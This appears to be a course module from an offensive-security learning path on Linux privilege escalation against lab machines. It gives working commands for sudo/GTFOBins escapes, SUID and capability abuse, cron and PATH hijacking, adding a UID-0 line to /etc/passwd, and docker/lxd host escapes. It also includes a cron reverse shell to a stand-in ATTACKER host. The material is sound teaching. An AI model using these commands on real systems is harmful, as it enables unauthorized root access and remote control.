# 05 — Linux Privilege Escalation

Eleven of the thirteen machines in this path end with the same final question: you
have a shell as a low-privilege user, and you want `root`. This module is the
ordered method for answering it.

> There is no `docs/PRIVESC-LINUX.md` in this repo. This module **is** the
> privilege-escalation reference for the path. The closest cross-references are
> [`docs/CONCEPTS.md` §15](../docs/CONCEPTS.md#15-linux-privilege-escalation) and
> [`docs/TOOLS.md`](../docs/TOOLS.md).

---

## 0. The mental model

Privilege escalation is **not** about finding a magic exploit. It is about finding
a **confused deputy**: something running as root that will do something for you
that you are not allowed to do yourself.

> ### 📖 Concept — The confused deputy problem
> A *confused deputy* is a more-privileged program that can be tricked into using
> its privilege on your behalf. `sudo`, SUID binaries, cron jobs, services and
> container runtimes are all deputies. The bug is almost never in the deputy — it
> is in the **configuration that lets a low-privilege user control its input**.
> Every technique in this module is a way of finding a deputy whose configuration
> is wrong.

**Enumerate, then reason.** The order below is not arbitrary: it is ordered by
*hit rate on beginner boxes*, highest first. Do not jump to a kernel exploit because
it is exciting — it is the lowest-probability vector here and the one most likely
to crash the machine.

```bash
id && sudo -l && uname -a && cat /etc/os-release
```

| Check | Question it answers |
| --- | --- |
| `id` | Who am I? Which groups? (`docker`, `lxd`, `sudo`, `www-data`) |
| `sudo -l` | What may I run **as root**? ← highest-yield single command |
| `uname -a` | What kernel? Old kernels have public local-root exploits |
| `cat /etc/os-release` | What distro/version? |

**Automate it** — but read the output; scripts miss context:

```bash
wget http://ATTACKER:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh | tee peas.txt
bash linux-smart-enumeration.sh          # or lse.sh
```

`linpeas` colour-codes a **95%+ probability** of being exploitable in red. Start
there. Serve it from your attack box with `python3 -m http.server 8000`.

---

## 1. `sudo` — the highest-yield vector

```bash
sudo -l
```

```text
Matching Defaults entries for mike on raven:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:...

User mike may run the following commands on raven:
    (ALL) NOPASSWD: /usr/bin/python
```

Read that as a contract: user `mike` may run `/usr/bin/python` as **any user**
(`(ALL)`) **without a password** (`NOPASSWD:`). The command is fixed — but Python
is an interpreter, so the *arguments* are yours, and that is the whole attack.

```bash
sudo /usr/bin/python -c 'import os; os.system("/bin/bash")'
# id -> uid=0(root)
```

> ### 📖 Concept — Why "a fixed command" is not a restriction
> The author of that `sudoers` line believed they were granting permission to run
> *one program*. What they actually granted is permission to run **anything that
> program can be made to do**. Any interpreter (`python`, `perl`, `ruby`, `php`),
> any pager (`less`, `more`), any editor (`vi`, `vim`, `nano`), any file transfer
> tool (`scp`, `curl`, `wget`, `ftp`) and any shell-out (`find -exec`, `tar`,
> `awk`, `zip`) is an escape hatch. This is why `sudo -l` is the first thing you run.

**[GTFOBins](https://gtfobins.github.io/) is the catalogue.** Search the binary name
and it gives you the exact escape. The pattern for every entry is the same:

```bash
# a pager that can run a shell command
sudo less /etc/profile        # then type  !/bin/sh
sudo more /etc/profile        # same

# editors that can shell out
sudo vi -c ':!/bin/sh' /dev/null
sudo vim -c ':!/bin/sh'
sudo nano                     # then Ctrl-R Ctrl-X, type /bin/sh

# anything that executes a file or a command
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
sudo python3 -c 'import os; os.execl("/bin/sh","sh")'
sudo perl -e 'exec "/bin/sh";'
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo curl -o /dev/null file:///etc/shadow          # read-only disclosure, still root-equivalent info
sudo tee /etc/cron.d/x <<< '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"'
```

**Machines 4, 10 and 12 are pure GTFOBins:**

| Machine | Binary | Why it works |
| --- | --- | --- |
| 4 (DC: 2) | `less`, `vi` | The `sudo` password is *known* but the user is in a restricted shell — GTFOBins escapes both |
| 10 (PwnLab: init) | `find`, `env` | A SUID chain first, then a sudo escape |
| 12 (symfonos: 1) | `curl` — **by bare name** | See §7: a relative path in `sudoers` is a PATH-hijack gift |

Also check `sudo -l` output for `(ALL:ALL)`, for `NOPASSWD:` vs a password prompt,
and for `Defaults env_keep +=` lines that preserve dangerous variables.

---

## 2. SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

> ### 📖 Concept — SUID and what `rws` means
> The **set-user-ID** bit makes a program run with the **effective UID of its
> owner**, not of whoever launched it. In `ls -l` the owner's execute position shows
> `s` instead of `x`: `-rwsr-xr-x root root /usr/bin/find`. Because the file is
> owned by `root`, anyone who runs it gets root privileges *for the duration of that
> process*. That is legitimate for `passwd` (which must write `/etc/shadow`) and
> catastrophic for anything that can be made to run a shell.

**Compare against the known-default set.** Most SUID binaries on any Linux system
are stock. The interesting one is the *extra*:

```text
/bin/su  /bin/mount  /bin/umount  /usr/bin/passwd  /usr/bin/sudo
/usr/bin/chsh  /usr/bin/chfn  /usr/bin/gpasswd  /usr/bin/newgrp
```

Anything outside that list is a lead. `find`, `vim`, `python`, `perl`, `php`,
`bash`, `env`, `nmap` (old versions), `cp`, `less`, `tail`, `curl`, `msgmike` —
all of these appear as SUID in machines in this path.

**Machine-by-machine, so you know what "normal" looks like:**

| Machine | SUID binary | Escape |
| --- | --- | --- |
| 3 (DC: 1) | `/usr/bin/find` | `find . -exec /bin/sh \; -quit` |
| 6 (bossplayersCTF) | a shell-ish binary | `bash -p` (keep privileges) |
| 10 (PwnLab: init) | `msgmike` → `msg2root` | A **two-stage chain**: `msgmike` runs `cat` by bare name (PATH hijack), `msg2root` takes stdin (inject a shell) |
| 11 (Photographer) | `php7.2` | `sudo php -r "system('/bin/bash');"` — or `-a` interactive |
| 12 (symfonos: 1) | `curl` **by bare name in sudoers** | See §7 |
| 13 (HackInOS) | `tail` | `sudo tail -n1 /etc/shadow` — disclosure, then escalate |

> **`bash -p` matters.** Many shells deliberately drop SUID privileges on start as a
> hardening measure. `bash -p` ("privileged") tells it not to. If you get a SUID
> bash and `id` still shows your old UID, that is why.

`find` is the canonical case because `-exec` is *designed* to run arbitrary
commands. Note the `-quit` — it stops after the first match so you are not spawning
shells for every directory.

---

## 3. Capabilities

Modern Linux splits root's powers into ~40 **capabilities**, and a file can be
granted individual ones without full SUID:

```bash
getcap -r / 2>/dev/null
```

```text
/usr/bin/python3.8 = cap_setuid+ep
/usr/bin/tar = cap_dac_read_search+ep
```

> ### 📖 Concept — Reading `cap_setuid+ep`
> `+ep` means the capability is in the **e**ffective and **p**ermitted sets — i.e.
> *active*. `cap_setuid` is the power to set your own UID. `cap_dac_read_search`
> bypasses **all** file *read* permission checks and directory *search* checks: it
> does not let you execute or write, but it lets you read `/root/flag.txt` and
> `/etc/shadow` regardless of their mode bits. Machine 8 is exactly this — an
> unusual, deliberately narrow grant that is trivial to exploit.

Common dangerous capabilities and what each gives you:

| Capability | Grants | Escalation |
| --- | --- | --- |
| `cap_setuid` | set your own UID | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `cap_dac_read_search` | read/search any file | `tar xf /etc/shadow` · read `/root/*` |
| `cap_dac_override` | bypass write checks too | overwrite anything |
| `cap_sys_admin` | near-root | mount, many paths |
| `cap_chown` | change any file's owner | `chown me /etc/passwd` |

`getcap` is a *separate* check from SUID. A hardened machine may have no unusual
SUID binaries at all and still be vulnerable through capabilities. **Run both.**

---

## 4. Cron jobs

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
ls -la /var/spool/cron/crontabs/ 2>/dev/null
```

```text
* * * * * root cd /var/www/html && bash backup.sh
```

The two questions:

1. **Is the script writable by me?**
   `ls -l /var/www/html/backup.sh` → `-rwxrwxrwx` means anyone can rewrite it.
   Append a reverse shell and wait up to a minute.
2. **Is the command referenced by bare name?** Then the `PATH` matters — see §7.

Machine 9 (CengBox: 1) is exactly case 1: a world-writable script run by `root`
every minute. The fix is to make the cron line use an **absolute path** and to
restrict the script's permissions.

> **Cron has a minimum granularity of one minute** and its environment is minimal:
> no `$PATH` beyond `/usr/bin:/bin`, no shell functions, no TTY. Write cron payloads
> with absolute paths (`/bin/bash`, not `bash`) and log to a file so you can debug.

Also check for a **writable `/etc/cron.d/`** — dropping a file there with a
`* * * * * root …` line is the same attack without needing an existing job.

---

## 5. Writable files owned by root

```bash
find / -writable -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -50
find /etc -writable -type f 2>/dev/null
find / -perm -o+w -type f 2>/dev/null     # world-writable
```

The interesting hits:

| File | If writable, then… |
| --- | --- |
| **`/etc/passwd`** | Add your own UID-0 account (see below) |
| **`/etc/shadow`** | Replace a hash with one you know, or with an empty field |
| `/etc/sudoers` | Add `user ALL=(ALL) NOPASSWD: ALL` |
| `/etc/ld.so.preload` | Inject a shared library into **every** process → instant root |
| `/etc/crontab`, `/etc/cron.d/*` | Root-executed arbitrary code |
| `/root/.ssh/authorized_keys` | SSH in as root |
| A root-run script anywhere | Rewrite it |
| A library in `/etc/ld.so.conf.d/` | Point at your directory → hijack a root binary |

Machine 1 is built on a **world-writable `/etc/passwd`** — an almost unheard-of
misconfiguration that is nonetheless the single fastest root on any box that has it.

### The `/etc/passwd` trick

`/etc/passwd` is colon-delimited, seven fields:

```text
michael:x:1000:1000:Michael Scott,,,:/home/michael:/bin/bash
      ^
      'x' means "the password hash lives in /etc/shadow"
```

Replace the `x` with a real hash and the kernel will authenticate **from this
file**, ignoring `/etc/shadow`:

```bash
openssl passwd -1 -salt ignite superpassword        # MD5-crypt, $1$…
echo 'ignite:$1$ignite$XpO6y1nK1vB0yG0yQ3m0o/:0:0:root:/root:/bin/bash' >> /etc/passwd
su ignite                                            # -> root
```

Set **UID and GID both to `0`** — that is what makes the account root. Generate the
hash on your attack machine if `openssl` is absent on the target; never hand-type a
hash (see [module 04 §4](04-Credentials-and-Cracking.md) on quoting `$`).

> **Prefer this over writing to `/etc/shadow`** when both are writable: `passwd`
> entries are additive, so you can delete your line afterwards and leave the system
> as you found it. Editing `/etc/shadow` in place risks locking out a real account.

---

## 6. Kernel exploits

```bash
uname -r; cat /etc/os-release
searchsploit linux kernel $(uname -r)
```

| Machine | Kernel | CVE | Exploit |
| --- | --- | --- | --- |
| 2 (CyberSploit) | Ubuntu 14.04 | **CVE-2015-1328** overlayfs · **CVE-2016-5195** Dirty COW | `ofs.c`, `dirtyc0w.c` |
| 5 (Kioptrix L1) | 2.4.x | several | distro-specific |
| 8 (Empire: Breakout) | Debian 10 | — | capabilities instead |

**Try kernel exploits last.** Three reasons: they frequently **panic the VM** (you
lose your shell and your progress), they are architecture- and version-specific
(needing compilation, sometimes patching), and on a beginner box there is almost
always a simpler configuration error sitting right in front of you. When you do use
one, prefer a **precompiled** binary if available and read the source first.

`linpeas` will tell you which CVEs apply to your kernel — trust that list more than
`searchsploit`, which matches on strings.

---

## 7. `PATH` hijacking

> ### 📖 Concept — What `PATH` actually does
> `PATH` is a colon-separated list of directories. When you type `find`, the shell
> searches those directories **left to right** and runs the **first match**. It does
> not verify that the match is the intended program. So if you can place a file named
> `find` in a directory that appears earlier in `PATH` than `/usr/bin`, your file runs
> instead.

The attack requires that something privileged invokes a command **by bare name**:

```bash
# a root cron job:  cd /var/www && ./backup.sh
# inside backup.sh:  tar -czf /backups/www.tar.gz .
# 'tar' is bare -> hijackable
```

```bash
mkdir -p /tmp/x
cat > /tmp/x/tar <<'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/x/tar
export PATH=/tmp/x:$PATH        # prepend, so yours is found first
./backup.sh                     # -> root shell
```

**Machine 10 (PwnLab: init)** escalates exactly this way: the SUID binary `msgmike`
calls `cat` by bare name, so placing your own `cat` earlier in `PATH` runs it with
`msgmike`'s privileges.

**Machine 12 (symfonos: 1)** is the same bug wearing a `sudoers` disguise: the entry
reads `NOPASSWD: curl` — a *bare name*, not `/usr/bin/curl`. `sudo` honours the
user's `PATH` unless `secure_path` overrides it, so a `curl` in a directory you
control becomes a root-executed shell. Check `sudo -l` output for the `Defaults
secure_path=` line: **if it is absent, bare-name sudo entries are hijackable.**

> **Always inspect the `Defaults` block of `sudo -l`.** `secure_path` is the single
> line that decides whether this entire vector is available.

Also worth checking: `echo $PATH` for `.` or an empty entry (meaning "current
directory"), and any writable directory already in the privileged `PATH`.

---

## 8. Groups as escalation vectors

`id` output can hand you root:

| Group | Grants | Escalation |
| --- | --- | --- |
| **`docker`** | talk to the Docker daemon, which runs as root | `docker run -v /:/host --rm -it alpine chroot /host` |
| **`lxd`** | create privileged containers | `lxc init ubuntu s -c security.privileged=true; lxc config device add s x disk source=/ path=/mnt; lxc start s; lxc exec s -- /bin/sh` |
| **`sudo`** | may run sudo (with a password) | `sudo -l`, then §1 |
| **`wheel`** | same, on RHEL-family | ditto |
| **`adm`** | read `/var/log/*` | harvest credentials, tokens |
| **`disk`** | raw access to block devices | `debugfs /dev/sda1` → read anything |
| **`shadow`** | read `/etc/shadow` | offline cracking |
| **`www-data`** | web server identity | read web configs, DB creds |
| **`video`** | framebuffer | read the screen |

Machine 9 (CengBox: 1) is an **`lxd`** escape. Machine 13 (HackInOS) is a **Docker
container escape** — see [module 06 §6](06-Shells-Persistence-and-Escapes.md) for
the mechanics of getting out of a container.

> ### 📖 Concept — Why `docker` and `lxd` membership is root
> Both daemons run as root and let a member create a process whose filesystem view
> they choose. Mounting the host's `/` into a container you control gives you a root
> shell on the host with no exploit, no CVE and no vulnerability in the software —
> only in the *group membership*. This is why "who is in the docker group" is a
> standard audit question.

---

## 9. The ordered checklist

Work top to bottom. Stop when you have root.

```text
[ ] 1. id; sudo -l              <- is there a GTFOBins entry?
[ ] 2. getcap -r / 2>/dev/null  <- unusual capabilities?
[ ] 3. find / -perm -4000 -type f 2>/dev/null  <- SUID outside the stock set?
[ ] 4. cat /etc/crontab; ls -la /etc/cron.d/   <- root cron, writable or bare-name?
[ ] 5. ls -l /etc/passwd /etc/shadow /etc/sudoers /etc/ld.so.preload  <- writable?
[ ] 6. find /etc -writable -type f 2>/dev/null
[ ] 7. echo $PATH; grep -rn 'Defaults secure_path' <- bare names anywhere?
[ ] 8. Reuse every credential you hold, everywhere
[ ] 9. Look for a root-executed script/service that reads YOUR file or directory
[ ]10. Kernel: uname -r, then linpeas's CVE list
```

Run `linpeas.sh` at any point to shortcut the search — but read the output rather
than piping it into your head. The value of doing this manually on these thirteen
machines is that you learn *what* to look for, which is the part no script teaches.

---

## 10. Exercises

1. **Create a SUID escalation on your own Kali.** As root, `cp /bin/find
   /usr/local/bin/find && chmod u+s /usr/local/bin/find`. Log in as a normal user
   and escalate. Then remove the SUID bit and confirm you cannot.
2. **Build a PATH hijack end to end.** Write a script that calls `tar` by bare name,
   make it root-owned and run it from cron. Hijack it as a normal user. Then fix it
   by using an absolute path and confirm the hijack fails.
3. **Test `cap_dac_read_search`.** As root, `setcap cap_dac_read_search+ep
   /usr/bin/tar`. As a normal user, use `tar` to read `/etc/shadow`. Remove the
   capability and confirm access is gone.
4. **Do the `/etc/passwd` trick in a throwaway VM** and then undo it. Verify `su`
   worked and that the account had UID 0.
5. **Enumerate without a script.** On any machine you have already rooted, run the
   ten-step checklist manually and record which step would have found it. Did you
   get it in the first three?

---

## 11. Check yourself

1. What is a confused deputy, and why is `sudo` the classic example?
2. `sudo -l` shows `(ALL) NOPASSWD: /usr/bin/less`. Write the escalation.
3. What does the `s` in `-rwsr-xr-x` mean, and what does the file's *owner* have to
   do with what you gain?
4. Why do you need `bash -p` when exploiting a SUID bash?
5. What does `cap_dac_read_search` let you do that ordinary file permissions would
   forbid?
6. A root cron job runs `bash /opt/backup.sh`, and `ls -l` shows `-rwxrwxrwx`. What
   do you do?
7. What line in `sudo -l` output decides whether a bare-name sudo entry is
   hijackable?
8. Name three groups that are effectively root, and say why.
9. Why is a kernel exploit the *last* thing you try on a beginner box?
10. You find `/etc/passwd` writable. Which two numeric fields must you set to make
    your new account root?

---

_Back to [Learning Path 1](README.md) · previous: [04 — Credentials and Cracking](04-Credentials-and-Cracking.md) · next: [06 — Shells, Persistence and Escapes](06-Shells-Persistence-and-Escapes.md)._
